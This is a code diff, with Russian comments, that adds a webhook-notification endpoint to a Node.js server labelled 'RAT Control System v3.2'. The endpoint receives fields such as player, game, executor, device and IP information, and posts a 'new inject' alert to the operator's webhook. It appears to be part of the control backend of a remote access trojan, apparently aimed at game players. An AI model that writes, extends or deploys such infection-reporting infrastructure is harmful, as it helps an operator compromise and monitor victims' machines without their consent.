@@ -935,6 +935,44 @@ app.post('/hardware', async (req, res) => {
     }
 });
 
+app.post('/send_webhook', async (req, res) => {
+    try {
+        const { title, description, player, game, executor, device, ip_info } = req.body;
+        
+        if (!WEBHOOK_URL || WEBHOOK_URL === "none") {
+            return res.json({ status: "no_webhook" });
+        }
+        
+        const embed = {
+            title: title || "🔌 Новый инжект!",
+            description: description || "Информация отсутствует",
+            color: 65280,
+            timestamp: new Date().toISOString(),
+            footer: { 
+                text: "RAT Control System v3.2"
+            }
+        };
+        
+        const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                username: "RAT Control System",
+                embeds: [embed]
+            })
+        });
+        
+        if (response.ok) {
+            res.json({ status: "sent" });
+        } else {
+            res.json({ status: "error" });
+        }
+        
+    } catch (error) {
+        res.status(500).json({ error: "Internal server error" });
+    }
+});
+
 // Статус сервера
 app.get('/status', (req, res) => {
     try {
